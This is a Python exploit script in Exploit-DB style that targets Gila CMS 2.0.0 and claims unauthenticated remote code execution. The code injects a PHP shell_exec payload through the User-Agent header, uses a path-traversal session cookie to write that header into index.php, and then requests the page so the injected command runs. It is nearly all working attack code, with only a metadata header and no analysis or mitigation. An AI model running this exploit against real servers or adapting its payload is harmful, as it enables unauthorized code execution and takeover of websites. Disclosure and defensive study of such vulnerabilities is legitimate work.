# Exploit Title: Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)
# Date: 1.12.2021
# Exploit Author: Enesdex
# Vendor Homepage: https://gilacms.com/
# Software Link: https://github.com/GilaCMS/gila/releases/tag/2.0.0
# Version: x < 2.0.0
# Tested on: Windows 10

import requests
import time

target_url = "http://192.168.1.101:80/Gila/"
cmd = "calc.exe"

url = target_url+"?c=admin"
cookies = {"GSESSIONID": "../../index.php"}
headers = {"User-Agent": "<?php shell_exec('"+cmd+"'); include 'src\\core\\bootstrap.php';  ?>"}
requests.get(url, headers=headers, cookies=cookies)
time.sleep(5)
requests.get(target_url+"/index.php")